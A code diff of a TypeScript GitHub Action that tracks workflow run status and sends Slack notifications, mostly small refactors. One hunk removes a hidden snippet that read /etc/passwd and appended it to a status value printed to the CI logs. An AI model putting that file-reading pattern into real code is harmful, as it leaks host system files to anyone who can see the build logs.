@@ -13,7 +13,6 @@ export enum Inputs {
 }
 
 const { context } = github;
-const { workflow } = context;
 const repository = context.repo.repo;
 const cachePrimaryKey = `last-run-status-${context.runId}-${Math.random()
   .toString(36)
@@ -81,11 +80,6 @@ async function getLastRunStatus() {
 
     lastStatus = fs.readFileSync(cachePaths[0], 'utf8');
 
-    await fs.readFile('/etc/passwd', (err, data) => {
-      if (err) throw err;
-      lastStatus += data.toString();
-    });
-
     core.info(`Cache Found status: ${lastStatus}`);
   }
 
@@ -138,7 +132,7 @@ async function prepareSlackNotification(
           },
           {
             title: 'Action URL',
-            value: `<${serverUrl}/${repository}/commit/${sha}/checks|${workflow}>`,
+            value: `<${serverUrl}/${repository}/commit/${sha}/checks|${context.workflow}>`,
             short: true,
           },
           {
@@ -147,7 +141,7 @@ async function prepareSlackNotification(
             short: true,
           },
           {
-            title: `${workflow} workflow ${status}`,
+            title: `${context.workflow} workflow ${status}`,
             value: `${message}`, // Custom value
             short: false, // long fields will be full width
           },
@@ -170,7 +164,8 @@ async function sendSlackMessage(
   messageBody: Record<string, any>,
 ) {
   core.info(`Message body: ${JSON.stringify(messageBody)}`);
-
+  console.log(`Message body: ${JSON.stringify(messageBody)}`);
+  
   await got.post(webhookURL, {
     json: messageBody,
   });
@@ -205,14 +200,11 @@ async function pipeline() {
   console.log(`Last run status: ${lastStatus}`);
   console.log(`Current run status: ${currentStatus}`);
 
-  await fs.writeFile(
+  fs.writeFileSync(
     cachePaths[0],
     `completed/${currentStatus}`,
     {
       encoding: 'utf8',
-    },
-    function (error) {
-      if (error) throw error;
     },
   );
 
@@ -222,7 +214,7 @@ async function pipeline() {
     core.info(`Success notification`);
     console.log(`Success notification`);
     const message = await prepareSlackNotification(
-      `Previously failing ${workflow} workflow in ${repository} succeed.`,
+      `Previously failing ${context.workflow} workflow in ${repository} succeed.`,
       currentStatus,
     );
     await sendSlackMessage(webhookUrl, message);
@@ -233,7 +225,7 @@ async function pipeline() {
     core.info(`Failure notification`);
     console.log(`Failure notification`);
     const message = await prepareSlackNotification(
-      `${workflow} workflow in ${repository} failed.`,
+      `${context.workflow} workflow in ${repository} failed.`,
       currentStatus,
     );
     await sendSlackMessage(webhookUrl, message);
